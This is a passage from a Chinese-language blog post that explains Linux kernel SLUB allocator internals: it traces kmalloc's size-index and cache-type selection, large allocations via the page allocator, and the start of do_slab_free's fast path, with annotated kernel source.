class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-：直接向-buddy-system-请求内存"><a href="#I-kmalloc-large-：直接向-buddy-system-请求内存" class="headerlink" title="I. kmalloc_large()：直接向 buddy system 请求内存"></a>I. kmalloc_large()：直接向 buddy system 请求内存</h3><p>对于请求大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 的内存分配请求而言， <code>kmalloc()</code> 会直接调用 <code>kmalloc_large()</code> 完成内存分配，最后实际上会在 <code>__kmalloc_large_node()</code> 调用 <code>alloc_pages()</code> 向 buddy system 请求内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了避免不必要的开销,我们将大的分配请求直接传递给页面分配器.</span><br><span class="hljs-comment"> * 我们使用 __GFP_COMP, 因为我们需要知道分配的 order 以在 kfree 中恰当地释放.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-：获取size对应下标"><a href="#II-kmalloc-index-：获取size对应下标" class="headerlink" title="II. __kmalloc_index()：获取size对应下标"></a>II. __kmalloc_index()：获取size对应下标</h3><p><code>kmalloc_index()</code> 其实就是 <code>__kmalloc_index（）</code>，根据请求的大小返回对应的下标，整体逻辑非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 算出一个特定大小的分配属于哪个 kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 注意: __kmalloc_index() 在编译期优化, 没有运行时优化;</span><br><span class="hljs-comment"> * 典型的用法为通过 kmalloc_index() 以在编译期优化.</span><br><span class="hljs-comment"> * 大小非常量的调用者仅应当为__kmalloc_index()的运行时开销可以被接受的测试模块.</span><br><span class="hljs-comment"> * 同样参见 kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-：获取标志位对应类型"><a href="#III-kmalloc-types-：获取标志位对应类型" class="headerlink" title="III. kmalloc_types()：获取标志位对应类型"></a>III. kmalloc_types()：获取标志位对应类型</h3><p><code>kmalloc_type()</code> 其实主要就是根据标志位返回类型，除了指定了 <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> 以外就都是 <code>KMALLOC_NORMAL</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 最常规的情况为 KMALLOC_NORMAL, 所以用一个单独的分支测试所有相关的标志位.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 至少需要设置一种标志位. 优先顺序为:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配"></a>IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>kmalloc_trace()</code> 主要是对 <code>__kmem_cache_alloc_node()</code> 的 wrapper，加上 tracepoint 和 kasan 的相关设置，需要注意的是这里会指定 node 为 <code>NUMA_NO_NODE</code>：</p><blockquote><p>不知道什么是 kernel trace point 的可以参见 <a href="https://docs.kernel.org/trace/tracepoints.html">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> 其实就是 <code>slab_alloc_node()</code> 的 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配"></a>V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>__kmalloc()</code> 其实就是指定 node 为 <code> NUMA_NO_NODE</code> 的 <code>__do_kmalloc_node()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配"><a href="#VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配" class="headerlink" title="VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配"></a>VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配</h3><p>该函数的主要逻辑为：</p><ul><li>若 <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ，则调用 <code>__kmalloc_large_node()</code> 进行分配，并进行 tracepoint 与 kasan 相关设置</li><li>对于常规 size：<ul><li>首先调用 <code>kmalloc_slab()</code> 获取对应的 <code>kmem_cache</code></li><li>接下来调用 <code>__kmem_cache_alloc_node()</code> 进行内存分配</li><li>最后进行 tracepoint 与 kasan 相关设置</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> 中寻找 <code>kmem_cache</code> 的过程和 kmalloc 类似，不过寻找下标用的是 <code>size_index[size_index_elem(size)]</code> 和 <code>fls()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 寻找满足给定大小的分配的 kmem_cache 结构体</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> 和 <code>size_index_elem()</code> 的定义都非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图"><a href="#三、上层调用接口关系图" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>因为很多比如说 <code>__kmem_cache_alloc_lru()</code> 一类的函数其实最后都是对 <code>slab_alloc_node()</code> 的套娃，这里笔者直接给出一个简易的调用关系图：</p><blockquote><p>只截取了笔者认为比较主要的那些，<del>因为作图作到后面实在蚌埠住了</del></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1 id="0x03-对象的释放"><a href="#0x03-对象的释放" class="headerlink" title="0x03. 对象的释放"></a>0x03. 对象的释放</h1><h2 id="※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）"><a href="#※-一、do-slab-free-：向指定的-kmem-cache-释放对象（链）" class="headerlink" title="※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）"></a>※ 一、do_slab_free()：向指定的 kmem_cache 释放对象（链）</h2><p>在 slab allocator 中存在着多个不同的内存释放接口，其最后都会调用到 <code>do_slab_free()</code> 完成内存释放的工作，需要注意的是该函数  <em><strong>允许释放已经连接成一条 freelist 且已经加密好的多个对象</strong></em>  ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 强制内联快速路径以创造无需额外的函数调用便能完成快速路径释放的kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径仅在我们要释放会当前 cpu slab 时生效.</span><br><span class="hljs-comment"> * 这通常是在我们刚刚分配了该对象的情况.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若快速路径不可用则退回 __slab_free 以处理所有种类的特殊处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 通过指定 head &amp; tail 指针 加上对象数量（cnt），可以大量释放包含多个对象的freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>与分配类似，释放同样分为快速路径与慢速路径</p><h3 id="I-直接释放回-percpu-slab（fast-path）"><a href="#I-直接释放回-percpu-slab（fast-path）" class="headerlink" title="I. 直接释放回 percpu slab（fast path）"></a>I. 直接释放回 percpu slab（fast path）</h3><p>快速路径比较简单，主要就是<strong>对比待释放对象所属 slab 是否为 percpu slab，若是则直接挂回去即可，遵循 LIFO 机制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 